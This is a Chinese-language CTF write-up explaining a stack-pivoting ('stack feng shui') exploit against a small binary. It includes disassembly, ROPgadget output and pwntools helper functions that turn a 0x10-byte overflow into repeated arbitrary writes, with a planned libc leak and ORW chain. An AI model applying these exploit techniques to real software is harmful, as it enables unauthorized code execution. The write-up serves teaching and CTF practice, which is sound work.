# 前言

栈风水----> 一切非常规的布局都是栈风水，我认为实际上是对于所有栈知识的灵活组合运用。所以重在灵活变通

这道题的栈风水在于利用任意地址写，实现任意次数的任意地址写，并且在程序使用start的时候会在栈上留下libc的地址，通过修改libc的地址，爆破使得地址泄漏；不过由于爆破需要非常多的时间，所以我会关闭地址随机化,并且我的脚本不会有爆破的步骤，因为非常费时间；

# 题: 

我们来说一下这个题吧

程序非常简单：只有一个main函数，并且仅仅溢出0x10的字节，，所以仅仅够覆盖返回地址，并且程序里面并没有给出任何后门函数

```assembly
.text:0000000000401288 ; int __fastcall main(int argc, const char **argv, const char **envp)
.text:0000000000401288                 public main
.text:0000000000401288 main            proc near               ; DATA XREF: _start+18↑o
.text:0000000000401288
.text:0000000000401288 buf             = byte ptr -8
.text:0000000000401288
.text:0000000000401288 ; __unwind {
.text:0000000000401288                 endbr64
.text:000000000040128C                 push    rbp
.text:000000000040128D                 push    rbx
.text:000000000040128E                 mov     rbp, rsp
.text:0000000000401291                 sub     rsp, 8
.text:0000000000401295                 mov     rdi, 0          ; fd
.text:000000000040129C                 lea     rsi, [rbp+buf]  ; buf
.text:00000000004012A0                 mov     rdx, 20h ; ' '  ; nbytes
.text:00000000004012A7                 call    _read
.text:00000000004012AC                 add     rsp, 8
.text:00000000004012B0                 pop     rbx
.text:00000000004012B1                 pop     rbp
.text:00000000004012B2                 retn
.text:00000000004012B2 main            endp
```

那么我们应该是可以注意到程序收栈的结构和我们正常的`leave ret`不太一样，这里的效果相当于`leave ret` ，但是不涉及到`rbp`， 也就是说`rbp`不影响栈。那么这里就有一个有意思的东西了，

看到这部分汇编：我们会发现从read读进去的地方是由`rsi`控制的 ，但是`rsi`又是由`rbp`寻址找到`buf`控制的 ，所以我们可以通过程序最后的`pop rbp`来控制下一次读进去的地方，这就是任意地址写

```assembly
.text:0000000000401295                 mov     rdi, 0          ; fd
.text:000000000040129C                 lea     rsi, [rbp+buf]  ; buf
.text:00000000004012A0                 mov     rdx, 20h ; ' '  ; nbytes
.text:00000000004012A7                 call    _read
```

而在前面我们又知道，`rsp`并不受`rbp`影响(因为正常的`rsp`是由`mov rsp,rbp`来控制的)，那么我们只需要将`rsp`放在一个满是`main`的或者`0x401295（read开始的地方）  `，这样我们就可以无限的读到任意地址了，并且以此循环！如果`rsp`和`rbp`在一起会是什么样子？`rsp`会破坏掉我们的布置好了的数据(`rsp`所在的地方程序会返回，导致我们的数据被一些地址覆盖掉)

无限次数的任意地址写成立，那么接下来就需要我们去想一下，我们需要泄漏`libc`，而程序是没有任何有关于控制寄存器的`gadget`

```bash
❯ ROPgadget --binary ./pwn --only "pop|ret"                                                                                                                                                     3.13.1  20:36
Gadgets information
============================================================
0x000000000040115d : pop rbp ; ret
0x00000000004012b0 : pop rbx ; pop rbp ; ret
0x000000000040101a : ret
0x00000000004012a2 : ret 0x20
0x0000000000401252 : ret 0x2be
0x000000000040105a : ret 0xffff

Unique gadgets found: 6
```

那么接下来我们就需要考虑一下我们的`_start`了，这个函数相信大家都不陌生，因为这个函数是程序真正的入口，

```assembly
.text:0000000000401090                 public _start
.text:0000000000401090 _start          proc near               ; DATA XREF: LOAD:00000000003FF018↑o
.text:0000000000401090 ; __unwind {
.text:0000000000401090                 endbr64
.text:0000000000401094                 xor     ebp, ebp
.text:0000000000401096                 mov     r9, rdx         ; rtld_fini
.text:0000000000401099                 pop     rsi             ; argc
.text:000000000040109A                 mov     rdx, rsp        ; ubp_av
.text:000000000040109D                 and     rsp, 0FFFFFFFFFFFFFFF0h
.text:00000000004010A1                 push    rax
.text:00000000004010A2                 push    rsp             ; stack_end
.text:00000000004010A3                 xor     r8d, r8d        ; fini
.text:00000000004010A6                 xor     ecx, ecx        ; init
.text:00000000004010A8                 mov     rdi, offset main ; main
.text:00000000004010AF                 call    cs:__libc_start_main_ptr
.text:00000000004010B5                 hlt
.text:00000000004010B5 ; } // starts at 401090
.text:00000000004010B5 _start          endp
```

可以看到调用了一个叫`__libc_start_main`的函数，这个函数会调用`__libc_start_call_main`，从而调用`main`函数，而在这个过程中，`__libc_start_main`也是需要保存返回地址的，也就是大家常见的用于收尾的函数，

![](./img/first-1.png)

而这个函数是`libc`的函数，所以，它的返回地址也是`libc`上的地址，而它会覆盖在`rbp-0x10`的位置，也就是返回地址。那么，是不是只需要我们去调用start就会在栈上留下`libc`的地址，接下来我们只需要同时得到两个`libc`的地址，将地址低的那个修改成`libc` 中的`pop rdi ;ret`，然后紧挨着放一个got表的地址，另一个修改成`libc`里面的`puts`，中间使用`ret`连接起来，那么就可以泄漏地址，

之后就很简单了，直接找个合适的位置打`ORW`即可

但是泄漏地址这一块，如果是在栈地址上，我们其实是不好用的，因为栈地址未知，不方便我们的风水构建，所以我们需要迁移到`.bss/.data`段上，但是，如果直接迁移到`bss`上会导致我们无法正常的返回，因为`bss`上没有正常的返回地址，并且`bss`上有一些重要的数据，比如IO结构体，因此我们需要把栈抬高

```python
 # exp_test
 s(p64(0) * 2 + p64(bss1) + p64(read_to))
  # bug()
  s(p64(main) * 4)
  s(p64(0) * 2 + p64(bss1) + p64(start))
   pause()
```

这样测试就会发现可以正常返回

![](./img/first-3.png)

但是显然，这样的写法实质上是大量重复的工作，而且需要不断计算地址，极其不健康

所以我们可以封装成函数，方便我们随时调用

```python
def write_to_qword(addr, data, do_pause=False, restart=True):
    assert len(data) <= 0x20
    s(p64(0) + p64(0) + p64(addr + 8) + p64(read_to))
    s(data)
    if do_pause:
        pause()
    else:
        pulse()
    if restart:
        io.send(p64(0) * 3 + p64(elf.sym["_start"]))

def write_data(addr, data, do_pause=False, restart=True):
    for i in range(0, len(data), 0x20):
        write_to_qword(addr + i, data[i : i + 0x20], do_pause, restart)

def stack_mov(rbp):
    s(p64(0) * 2 + p64(rbp - 8) + p64(leave_ret))
```

这样就可以任意长度任意地址写了，

然后接下来我们需要稍微布置一下栈结构了(也就是所谓的风水). 首先，我们我们肯定是需要布置我们心心念念的`libc`的地址的，所以需要两个`start`,而由于`main`最后会弹3个`qword`，所以两个`start`的地址之间至少有4qword































































